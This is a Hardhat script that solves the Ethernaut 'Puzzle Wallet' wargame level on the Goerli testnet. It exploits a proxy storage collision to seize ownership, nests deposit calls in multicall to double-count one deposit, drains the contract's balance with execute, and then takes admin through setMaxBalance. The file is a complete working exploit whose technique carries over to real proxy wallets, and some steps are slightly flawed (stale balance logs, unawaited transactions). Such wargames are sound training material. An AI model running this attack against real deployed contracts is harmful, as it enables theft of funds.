import { Wallet } from "ethers";
import { ethers } from "hardhat";

const attackPuzzleWallet = async () => {
    // change contract addresses here.
    const puzzleWalletAddress = "0xAc7EcD98B60C2094BdD63eEaF73436ebE8A28e9a"; //type "await contract.address()" in ethernaut console
    const playerAddress = "0x3C4f1C7Ab126a94016CA8F4e770522810aa61954";

    // Don't touch below
    // The vulnerability here arises due to storage collision between the proxy contract (PuzzleProxy) and logic contract (PuzzleWallet)
    // You may read more on:
    // https://eip2535diamonds.substack.com/p/understanding-delegatecall-and-how
    // https://blog.openzeppelin.com/proxy-patterns/
    // sample table below to compare storage
    // slot | PuzzleWallet  -  PuzzleProxy
    // ----------------------------------
    //  0   |   owner      <-  pendingAdmin
    //  1   |   maxBalance <-  admin
    //  2   |           .
    //  3   |           .

    // 1. Make player the owner
    // check owner
    const contractPuzzleWallet = await ethers.getContractAt("PuzzleWallet", puzzleWalletAddress);
    const owner = (await contractPuzzleWallet.owner()).toString();
    console.log(`Initial owner is ${owner}`);
    const provider = await ethers.getDefaultProvider("goerli");
    /*Private Keys in .env file or hardcode here*/
    const PRIVATE_KEY = process.env.PRIVATE_KEY || "";
    const wallet = new Wallet(PRIVATE_KEY, provider);
    const params = playerAddress;
    const funcSign = ["function proposeNewAdmin(address _newAdmin) external"];
    const iface = new ethers.utils.Interface(funcSign);
    const data = iface.encodeFunctionData("proposeNewAdmin", [params]);
    const tx1 = await wallet.sendTransaction({
        from: playerAddress,
        to: puzzleWalletAddress,
        data: data,
    });
    const txReceipt1 = await tx1.wait(1);
    console.log(txReceipt1);
    console.log(`Now owner is ${owner}...should be ${playerAddress}`);
    // 2. player adds himself to whitelist so that player can call onlyWhitelisted() guarded methods.
    const tx2 = await contractPuzzleWallet.addToWhitelist(playerAddress);
    const txReceipt2 = tx2.wait();
    // 3. alter maxBalance to add admin via setMaxbalance()
    // get balance of puzzle contract
    const puzzleWalletBalance = await provider.getBalance(puzzleWalletAddress);
    console.log(`Puzzzle Wallet balance is: ${puzzleWalletBalance}`);
    // setMaxBalance can only set new maxBalance only if the contract's balance is 0.
    // crack the contract's accounting mechanism so that we can withdraw more than deposited and hence drain contract's balance.
    // can be done via multicall below
    const depositData = contractPuzzleWallet.interface.encodeFunctionData("deposit");
    const multicallData = contractPuzzleWallet.interface.encodeFunctionData("multicall", [
        [depositData],
    ]);
    const tx3 = await contractPuzzleWallet.multicall([multicallData, multicallData], {
        value: ethers.utils.parseEther("0.001"),
    });
    const txReceipt3 = tx3.wait();
    // check balance after here
    // 4. execute() to drain contract balance
    const tx4 = await contractPuzzleWallet.execute(
        playerAddress,
        ethers.utils.parseEther("0.002"),
        "0x"
    );
    const txReceipt4 = tx4.wait();
    // puzzlew wallet balance should be 0
    console.log(`Puzzzle Wallet balance is: ${puzzleWalletBalance} (Should be 0 here)`);
    // 5. From here we can setmaxbalance() to change admin to player
    const tx5 = await contractPuzzleWallet.setMaxBalance(playerAddress);
    const txReceipt5 = tx5.wait();
};

attackPuzzleWallet()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });
